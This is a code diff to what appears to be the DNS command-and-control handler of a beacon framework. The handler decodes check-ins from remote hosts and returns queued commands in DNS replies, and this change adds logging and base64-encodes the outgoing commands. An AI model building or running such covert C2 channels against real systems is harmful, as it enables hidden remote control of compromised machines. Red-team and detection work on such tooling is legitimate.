@@ -18,6 +18,8 @@ retransmit = {
     "y": 25, "z": 26
 }
 
+UTF_ENCODING = "utf-8"
+
 class Records(Enum):
     """ The types of records the DNSHandler can currently encode """
     TXT = (QTYPE.TXT, TXT, 252)
@@ -43,15 +45,14 @@ class Opcodes(Enum):
 
 class Resolution(ProtocolHandler):
     """ This is the Provenance Handler implementation for DNS beacons"""
+    logger = logging.getLogger("Provenance")
 
     def __init__(self, ip, socket):
         super().__init__(ip, socket)
-        self.logger = logging.getLogger("Provenance")
         self.latest_request_id = None
         self.edns = False
         self.fragments = deque()
         self.prev_cmd = []
-        self.test = 1
 
     def __repr__(self):
         return "DNS"
@@ -64,6 +65,7 @@ class Resolution(ProtocolHandler):
             q = request.questions[0]
             # reverse the fqdn and split on "." for easier command fetching
             query = str(q.get_qname()).split(".")[::-1]
+            cls.logger.debug(query)
             return query[-1]
         except DNSError:
             return None
@@ -80,7 +82,7 @@ class Resolution(ProtocolHandler):
             query = str(q.get_qname()).split(".")[::-1]
             if query[3] == Domains.SYNC.value:
                 platform, hostname = query[5], query[4]
-                ip = str(base64.b64decode(query[6]), "utf-8")
+                ip = str(base64.b64decode(query[6]), UTF_ENCODING)
                 uuid = query[7]
                 self._send_data(request, port, Opcodes.ACK.value, None)
                 self.fragments.clear()
@@ -156,10 +158,13 @@ class Resolution(ProtocolHandler):
                         self.logger.debug("Returning To Ready State")
                         return 2
                     return 3
+                
                 # Otherwise we just send the next command
                 self.latest_request_id = request.header.id
                 cmd_opcode = 0 if cmd.type == CommandType.NOP else 3
-                self._send_data(request, port, cmd_opcode, cmd.command)
+                # Base64 Encode the command so nothing funky in transmission happens
+                encoded = base64.b64encode(bytes(cmd.command, UTF_ENCODING)).decode(UTF_ENCODING)
+                self._send_data(request, port, cmd_opcode, encoded)
                 return 2
             else:
                 pass
